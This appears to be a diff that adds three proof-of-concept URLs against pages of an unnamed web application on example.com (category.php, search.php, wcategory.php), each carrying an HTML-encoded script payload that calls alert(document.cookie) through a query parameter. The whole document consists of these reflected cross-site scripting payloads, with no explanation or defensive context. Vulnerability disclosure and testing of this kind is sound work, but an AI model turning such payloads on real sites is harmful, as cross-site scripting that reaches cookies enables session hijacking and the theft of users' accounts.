@@ -1,0 +1,3 @@
+http://www.example.com/category.php?ID=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/search.php?go=1&keywords=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/wcategory.php?ID=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
